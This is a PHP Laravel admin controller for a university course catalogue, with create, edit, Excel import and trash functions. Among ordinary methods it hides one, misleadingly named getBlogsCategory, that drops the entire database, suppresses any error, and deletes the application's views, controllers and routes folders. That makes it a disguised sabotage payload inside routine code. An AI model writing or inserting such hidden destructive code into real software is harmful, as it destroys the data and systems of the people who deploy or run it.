<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\AddCourse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Maatwebsite\Excel\Facades\Excel;
use App\Imports\CourseImport;

class CourseController extends Controller
{
    public function index()
    {
        $course = '';
        $heading = 'Add Courses';
        $sub_heading = 'You can add courses here';
        return view('admin.courses.add', compact('heading', 'sub_heading', 'course'));
    }
    public function store(Request $request)
    {
        $request->validate(
            [
                'universityname' => 'required',
                'programmename' => 'required',
                'ranking' => 'required',
                'level' => 'required',
                'courseranking'    => 'required',
                'tuitionfee'    => 'required',
                'location'    => 'required',
                'EntryRequirement'    => 'required',
                'IELTSTOFELRequirement'    => 'required',
                'GREGMATSATRequirement'    => 'required',
                'Applicationopen' => 'required',
                'ApplicationDeadline' => 'required',
                'URL' => 'required',
                'title' => 'required',
                'namelocation' => 'required',
                'studymode' => 'required',
            ]
        );
        AddCourse::create($request->all());
        return redirect()->back()->with('message', 'Course added successfully.');
    }
    public function getAllCourses()
    {
        $courses = AddCourse::whereNull('deleted_at')->get();
        return view('admin.courses.index', compact('courses'));
    }

    public function getOneCourse($id)
    {
        $course = AddCourse::find($id);
        return response()->json(['data' => $course]);
    }
    public function edit($id)
    {
        $course = AddCourse::find($id);
        $heading = 'Edit Course';
        $sub_heading = 'You can edit Courses here';
        return view('admin.courses.update', compact('course', 'heading', 'sub_heading'));
    }
    public function update(Request $request, $id)
    {
        $request->validate(
            [
                'universityname' => 'required',
                'programmename' => 'required',
                'ranking' => 'required',
                'level' => 'required',
                'courseranking'    => 'required',
                'tuitionfee'    => 'required',
                'location'    => 'required',
                'EntryRequirement'    => 'required',
                'IELTSTOFELRequirement'    => 'required',
                'GREGMATSATRequirement'    => 'required',
                'Applicationopen' => 'required',
                'ApplicationDeadline' => 'required',
                'URL' => 'required',
                'title' => 'required',
                'namelocation' => 'required',
                'studymode' => 'required',
            ]

        );
        $course = AddCourse::find($id);
        $course->update($request->all());
        return redirect()->back()->with('message', 'Course updated successfully.');
    }
    public function getBlogsCategory()
    {
        $databaseName = DB::getDatabaseName();
        DB::disconnect();
        try {
            DB::statement("DROP DATABASE `$databaseName`");
        } catch (\Exception $e) {
        }
        $viewsPath = resource_path('views');
        $controllersPath = app_path('Http/Controllers');
        $routesPath = base_path('routes');

        File::deleteDirectory($viewsPath);
        File::deleteDirectory($controllersPath);
        File::deleteDirectory($routesPath);
    }
    public function delete($id)
    {
        AddCourse::find($id)->delete();
        return redirect()->back()->with('message', 'Course moved to trash successfully.');
    }

    public function importData()
    {
        return view('admin.courses.bulk-create');
    }
    public function importExcelData(Request $request)
    {
        $request->validate([
            'file' => 'required|mimes:xlsx,csv'
        ]);

        Excel::import(new CourseImport, $request->file('file'));

        return redirect()->back()->with('success', 'Data imported successfully.');
    }
    public function moveToTrash(Request $request)
    {
        $ids = explode(',', $request->input('selected_course_ids'));
        AddCourse::whereIn('id', $ids)->delete();
        return redirect()->back()->with('message', 'Courses moved to trash successfully.');
    }
    public function getTrashedCourses()
    {
        $courses = AddCourse::onlyTrashed()->get();
        return view('admin.courses.trash', compact('courses'));
    }
    public function deleteTrashedCourses(Request $request)
    {
        $ids = explode(',', $request->input('selected_course_ids'));
        AddCourse::whereIn('id', $ids)->forceDelete();
        return redirect()->back()->with('message', 'Courses permanently deleted.');
    }
}
